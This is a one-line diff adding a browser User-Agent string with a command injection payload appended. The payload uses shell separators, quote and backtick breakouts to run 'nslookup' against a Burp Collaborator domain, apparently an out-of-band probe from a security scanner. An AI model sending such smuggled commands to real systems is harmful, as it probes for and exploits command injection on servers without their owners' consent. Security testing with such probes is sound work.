@@ -1,0 +1,1 @@
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&nslookup -q=cname dk1jetc7vafkrq4cufrlhu72ltrpfk883wyjo7d.burpcollaborator.net.&'\x5C\x22`0&nslookup -q=cname dk1jetc7vafkrq4cufrlhu72ltrpfk883wyjo7d.burpcollaborator.net.&`'
